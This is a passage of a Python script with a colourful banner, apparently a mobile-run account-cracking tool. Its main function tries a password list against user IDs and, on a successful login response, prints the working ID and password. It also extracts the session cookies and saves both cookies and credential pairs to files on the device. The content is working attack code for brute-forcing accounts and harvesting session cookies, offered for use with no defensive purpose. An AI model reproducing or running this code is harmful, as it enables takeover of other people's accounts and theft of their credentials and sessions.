...
\033[1;33m========= \33[32;33mJOK4R-AFG ≠ 2023 ≠ 64Bit\33[1;33m =========""")
def linex():
	print('\033[1;37m----------------------------------------------')
def clear():
	os.system('clear')
...
def fking1(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[37;41m [JOK4R➥SOJ1B]\33[0;m %s|\033[1;32mOK:-%s \033[1;31m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[31;47m [JOK4R>OK]\33[0;m\033[1;32m '+str(uid)+' | '+pas+'\033[1;97m')
                                        print("")
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print('\r\r\033[31;47m'"Cookie:\33[0;m\033[1;32m "+coki)
                                        open('/sdcard/A-JOK4R-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/A-JOK4R-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
